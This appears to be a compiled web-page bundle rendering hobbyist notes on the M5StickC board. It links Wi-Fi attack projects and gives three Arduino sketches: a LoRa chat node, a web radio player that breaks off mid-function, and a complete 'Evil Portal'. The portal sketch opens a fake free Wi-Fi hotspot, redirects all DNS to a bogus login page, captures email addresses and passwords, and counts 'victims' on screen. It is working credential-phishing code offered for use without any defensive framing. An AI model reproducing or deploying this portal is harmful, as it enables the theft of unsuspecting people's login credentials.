(window.webpackJsonp=window.webpackJsonp||[]).push([[305],{739:function(n,e,i){"use strict";i.r(e);var t=i(65),r=Object(t.a)({},(function(){var n=this,e=n.$createElement,i=n._self._c||e;return i("ContentSlotsDistributor",{attrs:{"slot-key":n.$parent.slotKey}},[i("p",[i("a",{attrs:{href:"https://docs.m5stack.com/en/uiflow/m5burner/intro",target:"_blank",rel:"noopener noreferrer"}},[n._v("M5Burner"),i("OutboundLink")],1)]),n._v(" "),i("h2",{attrs:{id:"m5stickc"}},[i("a",{staticClass:"header-anchor",attrs:{href:"#m5stickc"}},[n._v("#")]),n._v(" m5stickc")]),n._v(" "),i("p",[i("a",{attrs:{href:"https://www.hackster.io/glowascii/first-steps-with-m5stick-c-74804c",target:"_blank",rel:"noopener noreferrer"}},[n._v("First Steps with M5Stick-C"),i("OutboundLink")],1)]),n._v(" "),i("p",[i("a",{attrs:{href:"https://github.com/m5stack/M5StickC",target:"_blank",rel:"noopener noreferrer"}},[n._v("M5StickC Arduino Library"),i("OutboundLink")],1)]),n._v(" "),i("p",[i("a",{attrs:{href:"https://github.com/n0xa/m5stick-nemo",target:"_blank",rel:"noopener noreferrer"}},[n._v("M5Stick-NEMO"),i("OutboundLink")],1)]),n._v(" "),i("p",[i("a",{attrs:{href:"https://github.com/AH2005NA/m5stick-shark",target:"_blank",rel:"noopener noreferrer"}},[n._v("M5Stick-SHARK"),i("OutboundLink")],1)]),n._v(" "),i("p",[i("a",{attrs:{href:"https://github.com/7h30th3r0n3/Evil-M5Project",target:"_blank",rel:"noopener noreferrer"}},[n._v("Evil-M5Project"),i("OutboundLink")],1)]),n._v(" "),i("p",[i("a",{attrs:{href:"https://github.com/bmorcelli/M5Stick-Launcher",target:"_blank",rel:"noopener noreferrer"}},[n._v("M5Stick-Launcher"),i("OutboundLink")],1)]),n._v(" "),i("p",[i("a",{attrs:{href:"https://github.com/risinek/esp32-wifi-penetration-tool?tab=readme-ov-file",target:"_blank",rel:"noopener noreferrer"}},[n._v("Exploring possibilities of ESP32 platform to attack on nearby Wi-Fi networks."),i("OutboundLink")],1)]),n._v(" "),i("h3",{attrs:{id:"sdcard"}},[i("a",{staticClass:"header-anchor",attrs:{href:"#sdcard"}},[n._v("#")]),n._v(" SDCard")]),n._v(" "),i("p",[i("a",{attrs:{href:"https://www.youtube.com/watch?v=1M5tol5SP_w",target:"_blank",rel:"noopener noreferrer"}},[n._v("How to Connect and Use a Micro SD Card with M5StickC PLUS2 – Step by Step Guide!"),i("OutboundLink")],1)]),n._v(" "),i("h3",{attrs:{id:"evil-portal"}},[i("a",{staticClass:"header-anchor",attrs:{href:"#evil-portal"}},[n._v("#")]),n._v(" Evil Portal")]),n._v(" "),i("p",[n._v("https://github.com/JLSantos01/CapturePortalPTBR?tab=readme-ov-file")]),n._v(" "),i("div",{staticClass:"language- extra-class"},[i("pre",{pre:!0,attrs:{class:"language-text"}},[i("code",[n._v('#include <M5StickC.h>\n#include <WiFi.h>\n#include <DNSServer.h>\n#include <WebServer.h>\n\n// Configuração do usuário\n#define SSID_NAME "WiFi Livre-SP"\n#define SUBTITLE "Servico gratuito de internet"\n#define TITLE "Faca o Login:"\n#define BODY "Primeiro, crie uma conta para ter acesso."\n#define POST_TITLE "Estamos validando..."\n#define POST_BODY "Sua conta foi validada! Agora, aguarde entre 3 a 5 minutos para que seja conectado a rede.</br>Obrigado."\n#define PASS_TITLE "Credenciais"\n#define CLEAR_TITLE "Limpo"\n\nint capcount = 0;\nint previous = -1; // Hack to keep track\nint BUILTIN_LED = 10;\n\n// Inicialização das configurações do sistema\nconst byte HTTP_CODE = 200;\nconst byte DNS_PORT = 53;\nconst byte TICK_TIMER = 1000;\nIPAddress APIP(172, 0, 0, 1); // Gateway\n\nString Credenciais = "";\nunsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;\nDNSServer dnsServer;\nWebServer webServer(80);\n\nString input(String argName) {\n  String a = webServer.arg(argName);\n  a.replace("<", "&lt;");\n  a.replace(">", "&gt;");\n  a.substring(0, 200);\n  return a;\n}\n\nString footer() {\n  return "</div><div class=q><a>&#169; Todos os direitos reservados.</a></div>";\n}\n\nString header(String t) {\n  String a = String(SSID_NAME);\n  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"\n               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"\n               "div { padding: 0.5em; }"\n               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"\n               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"\n               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"\n               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"\n               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "\n               "textarea { width: 100%; }";\n  String h = "<!DOCTYPE html><html>"\n             "<head><title>" + a + " :: " + t + "</title>"\n             "<meta name=viewport content=\\"width=device-width,initial-scale=1\\">"\n             "<style>" + CSS + "</style></head>"\n             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";\n  return h;\n}\n\nString creds() {\n  return header(PASS_TITLE) + "<ol>" + Credenciais + "</ol><br><center><p><a style=\\"color:blue\\" href=/>Voltar para o Índice</a></p><p><a style=\\"color:blue\\" href=/clear>Limpar senhas</a></p></center>" + footer();\n}\n\nString index() {\n  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +\n         "<b>Email:</b> <center><input type=text autocomplete=email name=email></input></center>" +\n         "<b>Senha:</b> <center><input type=password name=Senha></input><input type=submit value=\\"Sign in\\"></form></center>" + footer();\n}\n\nString posted() {\n  String email = input("email");\n  String Senha = input("Senha");\n  Credenciais = "<li>Email: <b>" + email + "</b></br>Senha: <b>" + Senha + "</b></li>" + Credenciais;\n  return header(POST_TITLE) + POST_BODY + footer();\n}\n\nString clear() {\n  String email = "<p></p>";\n  String Senha = "<p></p>";\n  Credenciais = "<p></p>";\n  return header(CLEAR_TITLE) + "<div><p>A lista de credenciais foi resetada.</div></p><center><a style=\\"color:blue\\" href=/>Voltar para o Índice</a></center>" + footer();\n}\n\nvoid BLINK() { // O LED interno piscará 5 vezes quando uma senha for recebida.\n  int count = 0;\n  while (count < 5) {\n    digitalWrite(BUILTIN_LED, LOW);\n    delay(500);\n    digitalWrite(BUILTIN_LED, HIGH);\n    delay(500);\n    count = count + 1;\n  }\n}\n\nvoid setup() {\n  M5.begin();\n  M5.Lcd.setRotation(3);\n  M5.Lcd.fillScreen(BLACK);\n  M5.Lcd.setSwapBytes(true);\n  M5.Lcd.setTextSize(2);\n\n  bootTime = lastActivity = millis();\n  WiFi.mode(WIFI_AP);\n  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));\n  WiFi.softAP(SSID_NAME);\n  dnsServer.start(DNS_PORT, "*", APIP); // Spoofing DNS (Apenas HTTP)\n\n  webServer.on("/post", []() {\n    capcount = capcount + 1;\n    webServer.send(HTTP_CODE, "text/html", posted());\n    M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);\n    M5.Lcd.setCursor(0, 45);\n    M5.Lcd.print("status: ");\n    M5.Lcd.print("Vítima dentro");\n    BLINK();\n    M5.Lcd.fillScreen(BLACK);\n  });\n\n  webServer.on("/creds", []() {\n    webServer.send(HTTP_CODE, "text/html", creds());\n  });\n  webServer.on("/clear", []() {\n    webServer.send(HTTP_CODE, "text/html", clear());\n  });\n  webServer.onNotFound([]() {\n    lastActivity = millis();\n    webServer.send(HTTP_CODE, "text/html", index());\n  });\n  webServer.begin();\n  pinMode(BUILTIN_LED, OUTPUT);\n  digitalWrite(BUILTIN_LED, HIGH);\n}\n\nvoid loop() {\n  if ((millis() - lastTick) > TICK_TIMER) {\n    lastTick = millis();\n    if (capcount > previous) {\n      previous = capcount;\n\n      M5.Lcd.fillScreen(BLACK);\n      M5.Lcd.setSwapBytes(true);\n      M5.Lcd.setTextSize(2);\n      M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);\n      M5.Lcd.setCursor(0, 10);\n      M5.Lcd.print("PORTAL CAPTIVO");\n      M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);\n      M5.Lcd.setCursor(0, 35);\n      M5.Lcd.print("WiFi IP: ");\n      M5.Lcd.println(APIP);\n      M5.Lcd.printf("SSID: %s\\n", SSID_NAME);\n      M5.Lcd.printf("Contagem de vítimas: %d\\n", capcount);\n    }\n  }\n  dnsServer.processNextRequest();\n  webServer.handleClient();\n}\n')])])]),i("h3",{attrs:{id:"lorachat"}},[i("a",{staticClass:"header-anchor",attrs:{href:"#lorachat"}},[n._v("#")]),n._v(" LoraChat")]),n._v(" "),i("p",[i("a",{attrs:{href:"https://github.com/Jaimi5/LoRaChat",target:"_blank",rel:"noopener noreferrer"}},[n._v("A LoRa Chat long-distance communication using LoRa technology and ESP32 LoRa boards. "),i("OutboundLink")],1)]),n._v(" "),i("p",[i("a",{attrs:{href:"https://github.com/gato001k1/LoRaChat_M5_STICKC-_-2",target:"_blank",rel:"noopener noreferrer"}},[n._v("LoRaChat_M5_STICKC"),i("OutboundLink")],1)]),n._v(" "),i("p",[n._v("https://github.com/commodore1917/lorachat")]),n._v(" "),i("p",[n._v("M5StickC.ino")]),n._v(" "),i("div",{staticClass:"language- extra-class"},[i("pre",{pre:!0,attrs:{class:"language-text"}},[i("code",[n._v('// Includes\n//#include <Wire.h>\n#include <SSD1306Wire.h> // you need to install the ESP8266 oled driver for SSD1306 \n// by Daniel Eichorn and Fabrice Weinberg to get this file!\n// It\'s in the arduino library manager :-D\n\n#include <SPI.h>\n#include <LoRa.h>    // this is the one by Sandeep Mistry, \n// (also in the Arduino Library manager :D )\n\n// display descriptor\nSSD1306Wire display(0x3c, 4, 15);\n\n// definitions\n//SPI defs for LoRa radio\n#define SS 33\n#define RST -1\n#define DI0 32\n// #define BAND 429E6\n\n// LoRa Settings\n#define BAND 434500000.00\n#define spreadingFactor 9\n// #define SignalBandwidth 62.5E3\n#define SignalBandwidth 31.25E3\n#define codingRateDenominator 8\n#define preambleLength 8\n\n// we also need the following config data:\n// GPIO47 — SX1278’s SCK\n// GPIO45 — SX1278’s MISO\n// GPIO48 — SX1278’s MOSI\n// GPIO21 — SX1278’s CS\n// GPIO14 — SX1278’s RESET\n// GPIO26 — SX1278’s IRQ(Interrupt Request)\n\n// misc vars\nString msg;\nString displayName;\nString sendMsg;\nchar chr;\nint i = 0;\n\n// Helpers func.s for LoRa\nString mac2str(int mac)\n{\n  String s;\n  byte *arr = (byte*) &mac;\n  for (byte i = 0; i < 6; ++i)\n  {\n    char buff[3];\n    // yea, this is a sprintf... fite me...\n    sprintf(buff, "%2X", arr[i]);\n    s += buff;\n    if (i < 5) s += \':\';\n  }\n  return s;\n}\n\n// let\'s set stuff up! \nvoid setup() {\n  // reset the screen\n  pinMode(16, OUTPUT);\n  digitalWrite(16, LOW); // set GPIO16 low to reset OLED\n  delay(50);\n  digitalWrite(16, HIGH);\n  Serial.begin(115200);\n  while (!Serial); //If just the the basic function, must connect to a computer\n\n  // Initialising the UI will init the display too.\n  display.init();\n  display.flipScreenVertically();\n  display.setFont(ArialMT_Plain_10);\n  display.setTextAlignment(TEXT_ALIGN_LEFT);\n  display.drawString(5, 5, "LoRa Chat Node");\n  display.display();\n\n  SPI.begin(0, 36, 26, 33);\n  LoRa.setPins(SS, RST, DI0);\n  Serial.println("LoRa Chat Node");\n  if (!LoRa.begin(BAND)) {\n    Serial.println("Starting LoRa failed!");\n    while (1);\n  }\n\n  Serial.print("LoRa Spreading Factor: ");\n  Serial.println(spreadingFactor);\n  LoRa.setSpreadingFactor(spreadingFactor);\n\n  Serial.print("LoRa Signal Bandwidth: ");\n  Serial.println(SignalBandwidth);\n  LoRa.setSignalBandwidth(SignalBandwidth);\n\n  LoRa.setCodingRate4(codingRateDenominator);\n\n  LoRa.setPreambleLength(preambleLength);\n\n  Serial.println("LoRa Initial OK!");\n  display.drawString(5, 20, "LoRaChat is running!");\n  display.display();\n  delay(2000);\n  Serial.println("Welcome to LoRaCHAT!");\n  // get MAC as initial Nick\n  int MAC = ESP.getEfuseMac();\n  displayName = mac2str(MAC);\n  //displayName.trim(); // remove the newline\n  Serial.print("Initial nick is "); Serial.println(displayName);\n  Serial.println("Use /? for command help...");\n  Serial.println(": ");\n  display.clear();\n  display.drawString(5, 20, "Nickname set:");\n  display.drawString(20, 30, displayName);\n  display.display();\n  delay(1000);\n}\n\nvoid loop() {\n  // Receive a message first...\n  int packetSize = LoRa.parsePacket();\n  if (packetSize) {\n    display.clear();\n    display.drawString(3, 0, "Received Message!");\n    display.display();\n    while (LoRa.available()) {\n      String data = LoRa.readString();\n      display.drawString(20, 22, data);\n      display.display();\n      Serial.println(data);\n    }\n  } // once we\'re done there, we read bytes from Serial\n  if (Serial.available()) {\n    chr = Serial.read();\n    Serial.print(chr); // so the user can see what they\'re doing :P\n    if (chr == \'\\n\' || chr == \'\\r\') {\n      msg += chr; //msg+=\'\\0\'; // should maybe terminate my strings properly....\n      if (msg.startsWith("/")) {\n        // clean up msg string...\n        msg.trim(); msg.remove(0, 1);\n        // process command...\n        char cmd[1]; msg.substring(0, 1).toCharArray(cmd, 2);\n        switch (cmd[0]){\n          case \'?\':\n            Serial.println("Supported Commands:");\n            Serial.println("h - this message...");\n            Serial.println("n - change Tx nickname...");\n            Serial.println("d - print Tx nickname...");\n            break;\n          case \'n\':\n            displayName = msg.substring(2);\n            Serial.print("Display name set to: "); Serial.println(displayName);\n            break;\n          case \'d\':\n            Serial.print("Your display name is: "); Serial.println(displayName);\n            break;\n          default:\n            Serial.println("command not known... use \'h\' for help...");\n        }\n        msg = "";\n      }\n      else {\n        // ssshhhhhhh ;)\n        Serial.print("Me: "); Serial.println(msg);\n        // assemble message\n        sendMsg += displayName;\n        sendMsg += "> ";\n        sendMsg += msg;\n        // send message\n        LoRa.beginPacket();\n        LoRa.print(sendMsg);\n        LoRa.endPacket();\n        display.clear();\n        display.drawString(1, 0, sendMsg);\n        display.display();\n        // clear the strings and start again :D\n        msg = "";\n        sendMsg = "";\n        Serial.print(": ");\n      }\n    }\n    else {\n      msg += chr;\n    }\n  }\n}\n')])])]),i("h3",{attrs:{id:"web-radio"}},[i("a",{staticClass:"header-anchor",attrs:{href:"#web-radio"}},[n._v("#")]),n._v(" "),i("a",{attrs:{href:"https://www.hackster.io/tommyho/arduino-web-radio-player-c4cb23",target:"_blank",rel:"noopener noreferrer"}},[n._v("web radio"),i("OutboundLink")],1)]),n._v(" "),i("div",{staticClass:"language- extra-class"},[i("pre",{pre:!0,attrs:{class:"language-text"}},[i("code",[n._v('TFTTerminal.h\n#ifndef _TFTTERMINAL_H_\n#define _TFTTERMINAL_H_\n\n#include <M5StickC.h>\n#include <Print.h>\n\nclass TFTTerminal : public Print\n{\nprivate:\n    TFT_eSprite *disptr;\n    char discharbuff[60][55];\n    uint32_t xpos = 0,ypos = 0, dispos = 0;\n    TFT_eSprite* _dis_buff_ptr = NULL;\n    uint16_t _bkcolor = TFT_BLACK;\n    uint16_t _color = TFT_GREEN;\n\n    uint16_t _win_x_pos = 0,_win_y_pos = 0,_win_w = 160,_win_h = 80;\n    uint16_t _font_x_size = 6,_font_y_size = 8;\n    uint16_t _line_x_limit = 53,_line_y_limit = 30;\n\npublic:\n    TFTTerminal(TFT_eSprite *dis_buff_ptr);\n    ~TFTTerminal();\n    \n    void setcolor( uint16_t color, uint16_t bk_color );\n    void setGeometry(uint16_t x, uint16_t y, uint16_t w, uint16_t h );\n    void setFontsize(uint8_t size);\n\n    size_t write(uint8_t) ;\n    size_t write(const uint8_t *buffer, size_t size);\n};\n\n\n#endif\n\nm5WebRadio.ino:\n#include <M5StickC.h>\n#include <WiFi.h>\n#include <AudioFileSource.h>\n#include <AudioFileSourceBuffer.h>\n#include <AudioFileSourceICYStream.h>\n#include <AudioGeneratorTalkie.h>\n#include <AudioGeneratorMP3.h>\n#include <AudioOutputI2S.h>\n#include <AudioOutputI2SNoDAC.h>\n#include <spiram-fast.h>\n\n//  \n//  m5WebRadio Version 2020.12c (MP3 / Voice Edition)\n//  Board: M5StickC (esp32)\n//  Author: tommyho510@gmail.com\n//  Original Author: Milen Penev \n//  Required: Arduino library ESP8266Audio 1.60\n//  Dependency: TFTTerminal.h\n//\n\n// Enter your WiFi, Station, button settings here:\nconst char *SSID = "XXXXXXXX";\nconst char *PASSWORD = "XXXXXXXX";\nconst int bufferSize = 16 * 1024; // buffer in byte, default 16 * 1024 = 16kb\nchar * arrayURL[11] = {\n  "http://jenny.torontocast.com:8134/stream",\n  "http://ais-edge09-live365-dal02.cdnstream.com/a25710",\n  "http://188.165.212.154:8478/stream",\n  "https://igor.torontocast.com:1025/;.mp3",\n  "http://streamer.radio.co/s06b196587/listen",\n  "http://sj32.hnux.com/stream?type=http&nocache=3104", \n  "http://sl32.hnux.com/stream?type=http&nocache=1257", \n  "http://media-ice.musicradio.com:80/ClassicFMMP3",\n  "http://naxos.cdnstream.com:80/1255_128",\n  "http://149.56.195.94:8015/steam",\n  "http://ice2.somafm.com/christmas-128-mp3"\n};\nString arrayStation[11] = {\n  "Mega Shuffle",\n  "Orig. Top 40",\n  "Way Up Radio",\n  "Asia Dream",\n  "KPop Way Radio",\n  "Smooth Jazz",\n  "Smooth Lounge",\n  "Classic FM",\n  "Lite Favorites",\n  "MAXXED Out",\n  "SomaFM Xmas"\n};\nconst int LED = 10;   // GPIO LED \nconst int BTNA = 37;  // GPIO Play and Pause\nconst int BTNB = 39;  // GPIO Switch Channel / Volume\n\n// Objects and variables\nTFT_eSprite Disbuff = TFT_eSprite(&M5.Lcd);\nAudioGeneratorTalkie *talkie;          \nAudioGeneratorMP3 *mp3;\nAudioFileSourceICYStream *file;\nAudioFileSourceBuffer *buff;\nAudioOutputI2S *out;\n\nconst int numCh = sizeof(arrayURL)/sizeof(char *);\nbool TestMode = false;\nuint32_t LastTime = 0;\nint playflag = 0;\nint ledflag = 0;\n//int btnaflag = 0;\n//int btnbflag = 0;\nfloat fgain = 1.0;\nint sflag = 0;\nchar *URL = arrayURL[sflag]; \nString station = arrayStation[sflag];\nuint8_t spHELLO[]         PROGMEM = {0x00,0xC0,0x80,0x60,0x59,0x08,0x10,0x3D,0xB7,0x00,0x62,0x64,0x3D,0x55,0x4A,0x9E,0x66,0xDA,0xF6,0x56,0xB7,0x3A,0x55,0x76,0xDA,0xED,0x92,0x75,0x57,0xA3,0x88,0xA8,0xAB,0x02,0xB2,0xF4,0xAC,0x67,0x23,0x73,0xC6,0x2F,0x0C,0xF3,0xED,0x62,0xD7,0xAD,0x13,0xA5,0x46,0x8C,0x57,0xD7,0x21,0x0C,0x22,0x4F,0x93,0x4B,0x27,0x37,0xF0,0x51,0x69,0x98,0x9D,0xD4,0xC8,0xFB,0xB8,0x98,0xB9,0x56,0x23,0x2F,0x93,0xAA,0xE2,0x46,0x8C,0x52,0x57,0x66,0x2B,0x8C,0x07};\nuint8_t spHELP[]          PROGMEM = {0x08,0xB0,0x4E,0x94,0x00,0x21,0xA8,0x09,0x20,0x66,0xF1,0x96,0xC5,0x66,0xC6,0x54,0x96,0x47,0xEC,0xAA,0x05,0xD9,0x46,0x3B,0x71,0x94,0x51,0xE9,0xD4,0xF9,0xA6,0xB7,0x18,0xB5,0x35,0xB5,0x25,0xA2,0x77,0xB6,0xA9,0x97,0xB1,0xD7,0x85,0xF3,0xA8,0x81,0xA5,0x6D,0x55,0x4E,0x0D,0x00,0xC0,0x00,0x1B,0x3D,0x30,0x00,0x0F};\nuint8_t spREADY[]         PROGMEM = {0x6A,0xB4,0xD9,0x25,0x4A,0xE5,0xDB,0xD9,0x8D,0xB1,0xB2,0x45,0x9A,0xF6,0xD8,0x9F,0xAE,0x26,0xD7,0x30,0xED,0x72,0xDA,0x9E,0xCD,0x9C,0x6D,0xC9,0x6D,0x76,0xED,0xFA,0xE1,0x93,0x8D,0xAD,0x51,0x1F,0xC7,0xD8,0x13,0x8B,0x5A,0x3F,0x99,0x4B,0x39,0x7A,0x13,0xE2,0xE8,0x3B,0xF5,0xCA,0x77,0x7E,0xC2,0xDB,0x2B,0x8A,0xC7,0xD6,0xFA,0x7F};\nuint8_t spSTOP[]          PROGMEM = {0x0C,0xF8,0xA5,0x4C,0x02,0x1A,0xD0,0x80,0x04,0x38,0x00,0x1A,0x58,0x59,0x95,0x13,0x51,0xDC,0xE7,0x16,0xB7,0x3A,0x75,0x95,0xE3,0x1D,0xB4,0xF9,0x8E,0x77,0xDD,0x7B,0x7F,0xD8,0x2E,0x42,0xB9,0x8B,0xC8,0x06,0x60,0x80,0x0B,0x16,0x18,0xF8,0x7F};\nuint8_t spSWITCH[]        PROGMEM = {0x08,0xF8,0x3B,0x93,0x03,0x1A,0xB0,0x80,0x01,0xAE,0xCF,0x54,0x40,0x33,0x99,0x2E,0xF6,0xB2,0x4B,0x9D,0x52,0xA7,0x36,0xF0,0x2E,0x2F,0x70,0xDB,0xCB,0x93,0x75,0xEE,0xA6,0x4B,0x79,0x4F,0x36,0x4C,0x89,0x34,0x77,0xB9,0xF9,0xAA,0x5B,0x08,0x76,0xF5,0xCD,0x73,0xE4,0x13,0x99,0x45,0x28,0x77,0x11,0xD9,0x40,0x80,0x55,0xCB,0x25,0xE0,0x80,0x59,0x2F,0x23,0xE0,0x01,0x0B,0x08,0xA0,0x46,0xB1,0xFF,0x07};\nuint8_t spPAUSE[]         PROGMEM = {0x00,0x00,0x00,0x00,0xFF,0x0F};\n\nvoid Displaybuff() {\n    if (TestMode) {\n        Disbuff.setTextSize(1);\n        Disbuff.setTextColor(TFT_RED);\n        Disbuff.drawString("Test Mode", 0, 0, 1);\n        Disbuff.setTextColor(TFT_WHITE);\n    }\n    Disbuff.pushSprite(0, 0);\n}\n\nvoid ColorBar() {\n    float color_r, color_g, color_b;\n    color_r = 0;\n    color_g = 0;\n    color_b = 255;\n\n    for (int i = 0; i < 384; i=i+4) {\n        if (i < 128) {\n            color_r = i * 2;\n            color_g = 0;\n            color_b = 255 - (i * 2);\n        }\n        else if ((i >= 128) && (i < 256)) {\n            color_r = 255 - ((i - 128) * 2);\n            color_g = (i - 128) * 2;\n            color_b = 0;\n        }\n        else if ((i >= 256) && (i < 384)) {\n            color_r = 0;\n            color_g = 255 - ((i - 256) * 2);\n            ;\n            color_b = (i - 256) * 2;\n            ;\n        }\n        Disbuff.fillRect(0, 0, 180, 80, Disbuff.color565(color_r, color_g, color_b));\n        Displaybuff();\n    }\n\n    for (int i = 0; i < 4; i++) {\n        switch (i) {\n        case 0:\n            color_r = 0;\n            color_g = 0;\n            color_b = 0;\n            break;\n        case 1:\n            color_r = 255;\n            color_g = 0;\n            color_b = 0;\n            break;\n        case 2:\n            color_r = 0;\n            color_g = 255;\n            color_b = 0;\n            break;\n        case 3:\n            color_r = 0;\n            color_g = 0;\n            color_b = 255;\n            break;\n        }\n        for (int n = 0; n < 240; n++) {\n            color_r = (color_r < 255) ? color_r + 1.0625 : 255U;\n            color_g = (color_g < 255) ? color_g + 1.0625 : 255U;\n            color_b = (color_b < 255) ? color_b + 1.0625 : 255U;\n            Disbuff.drawLine(n, i * 20, n, (i + 1) * 20, Disbuff.color565(color_r, color_g, color_b));\n        }\n    }\n    Displaybuff();\n    delay(500);\n\n    for (int i = 0; i < 4; i++) {\n        switch (i) {\n        case 0:\n            color_r = 255;\n            color_g = 255;\n            color_b = 255;\n            break;\n        case 1:\n            color_r = 255;\n            color_g = 0;\n            color_b = 0;\n            break;\n        case 2:\n            color_r = 0;\n            color_g = 255;\n            color_b = 0;\n            break;\n        case 3:\n            color_r = 0;\n            color_g = 0;\n            color_b = 255;\n            break;\n        }\n        for (int n = 0; n < 240; n++) {\n            color_r = (color_r > 2) ? color_r - 1.0625 : 0U;\n            color_g = (color_g > 2) ? color_g - 1.0625 : 0U;\n            color_b = (color_b > 2) ? color_b - 1.0625 : 0U;\n            Disbuff.drawLine(159 - n, i * 20, 159 - n, (i + 1) * 20, Disbuff.color565(color_r, color_g, color_b));\n        }\n    }\n    Displaybuff();\n    delay(500);\n}\n\nvoid setup() {\n  Serial.begin(115200);\n  pinMode(LED, OUTPUT);\n  digitalWrite(LED , HIGH);\n  pinMode(BTNA, INPUT);\n  pinMode(BTNB, INPUT);\n\n  M5.begin();\n  M5.Lcd.setRotation(3);\n\n  // Screen Check\n  Disbuff.createSprite(160, 80);\n  Disbuff.fillRect(0,0,160,80,Disbuff.color565(10,10,10));\n  Disbuff.pushSprite(0,0);\n  delay(500);\n  M5.Axp.ScreenBreath(12);\n  ColorBar();\n\n  Disbuff.fillRect(0,0,160,80,TFT_BLACK);\n  Disbuff.setTextSize(2);\n  Disbuff.drawString("M5StickC", 0, 0, 1);\n  Disbuff.drawString("    WebRadio", 0, 35, 1);\n  Disbuff.pushSprite(0, 0);\n  M5.update();\n  M5.Lcd.fillScreen(BLACK);\n  M5.Lcd.setTextSize(2);\n  M5.Lcd.println("M5StickC");\n  M5.Lcd.println("    WebRadio");\n  delay(1000);\n  M5.Lcd.println("WiFi");\n  M5.Lcd.println("  Connecting");\n  initwifi();\n\n//  StartPlaying();\n  M5.Lcd.fillScreen(BLACK);\n  M5.Lcd.setTextSize(2);\n  M5.Lcd.setCursor(0, 0, 2);\n  M5.Lcd.print("Ready");\n\n  M5.Lcd.setTextSize(1);\n  M5.Lcd.setCursor(0, 30, 2);\n  M5.Lcd.print("Ch ");\n  M5.Lcd.print(sflag + 1);\n  M5.Lcd.print(" - ");\n  M5.Lcd.print(station);\n  M5.Lcd.print("          ");\n\n  Serial.printf("STATUS(System) Ready \\n\\n");\n  out = new AudioOutputI2S(0, 1); // Output to builtInDAC\n  out->SetOutputModeMono(true);\n  out->SetGain(fgain*0.05);\n  talkie = new AudioGeneratorTalkie();\n  talkie->begin(nullptr, out);\n  talkie->say(spREADY, sizeof(spREADY));\n  talkie->say(spPAUSE, sizeof(spPAUSE));\n}\n\nvoid loop() {\n  static int lastms = 0;\n  if (playflag == 0) {\n    if (digitalRead(BTNA) ==  LOW) {\n      StartPlaying();\n      playflag = 1;\n      M5.Lcd.setTextSize(2);\n      M5.Lcd.setCursor(0, 0, 2);\n      M5.Lcd.print("Playing");\n    }\n\n    if (digitalRead(BTNB) ==  LOW) {\n      sflag = (sflag + 1) % numCh;\n      URL = arrayURL[sflag];\n      station = arrayStation[sflag];           \n      M5.Lcd.fillScreen(BLACK);\n      M5.Lcd.setTextSize(1);\n      M5.Lcd.setCursor(0, 30, 2);\n      M5.Lcd.print("Ch ");\n      M5.Lcd.print(sflag + 1);\n      M5.Lcd.print(" - ");\n      M5.Lcd.print(station);\n      M5.Lcd.print("          ");\n      talkie->begin(nullptr, out);\n      talkie->say(spSWITCH, sizeof(spSWITCH));\n      talkie->say(spPAUSE, sizeof(spPAUSE));\n      delay (200);\n    }\n  }\n\n  if (playflag == 1) {\n    if (mp3->isRunning()) {\n      if (millis() - lastms > 1000) {\n        lastms = millis();\n        Serial.printf("STATUS(Streaming) %d ms...\\n", lastms);\n\n        ledflag = ledflag + 1;\n        if (ledflag > 1) {\n          ledflag = 0;\n          digitalWrite(LED , HIGH);\n        } else {\n          digitalWrite(LED , LOW);\n        }\n\n      }\n      if (!mp3->loop()) mp3->stop();\n    } else {\n      Serial.printf("MP3 done\\n");\n      playflag = 0;\n      digitalWrite(LED , HIGH);\n      M5.Lcd.setTextSize(2);\n      M5.Lcd.setCursor(0, 0, 2);\n      M5.Lcd.print("Stop     ");\n//      ESP.restart();\n    }\n    if (digitalRead(BTNA) ==  LOW) {\n      StopPlaying();\n      playflag = 0;\n      digitalWrite(LED , HIGH);\n      M5.Lcd.setTextSize(2);\n      M5.Lcd.setCursor(0, 0, 2);\n      M5.Lcd.print("Stop     ");\n      talkie->begin(nullptr, out);\n      talkie->say(spSTOP, sizeof(spSTOP));\n      talkie->say(spPAUSE, sizeof(spPAUSE));\n      M5.Lcd.fillRect(109, 0, 160, 21, BLACK);\n      delay(200);\n    }\n    if (digitalRead(BTNB) ==  LOW) {\n      fgain = fgain + 1.0;\n      if (fgain > 10.0) {\n        fgain = 1.0;\n      }\n      out->SetGain(fgain*0.05);\n      M5.Lcd.fillRect(109, 0, 160, 21, BLACK);\n      M5.Lcd.fillTriangle(109, 20, 109 + (5 * fgain), 20, 109 + (5 * fgain), 20 - (2 * fgain), BLUE);\n      Serial.printf("STATUS(Gain) %f \\n", fgain*0.05);\n      delay(200);\n    }\n  }\n}\n\nvoid StartPlaying() {\n  file = new AudioFileSourceICYStream(URL);\n  file->RegisterMetadataCB(MDCallback, (void*)"ICY");\n  buff = new AudioFileSourceBuffer(file, bufferSize);\n  buff->RegisterStatusCB(StatusCallback, (void*)"buffer");\n  out = new AudioOutputI2S(0, 1); // Output to builtInDAC\n  out->SetOutputModeMono(true);\n//  out->SetGain(0.3);\n  out->SetGain(fgain*0.05);\n  M5.Lcd.fillTriangle(109, 20, 109 + (5 * fgain), 20, 109 + (5 * fgain), 20 - (2 * fgain), BLUE);\n  mp3 = new AudioGeneratorMP3();\n  mp3->RegisterStatusCB(StatusCallback, (void*)"mp3");\n  mp3->begin(buff, out);\n  Serial.printf("STATUS(URL) %s \\n", URL);\n  Serial.flush();\n}\n\nvoid StopPlaying() {\n  if (mp3) {\n    mp3->stop();\n    delete mp3;\n    mp3 = NULL;\n  }\n  if (buff) {\n    buff->close();\n    delete buff;\n    buff = NULL;\n  }\n  if (file) {\n    file->close();\n    delete file;\n    file = NULL;\n  }\n  Serial.printf("STATUS(Stopped)\\n");\n  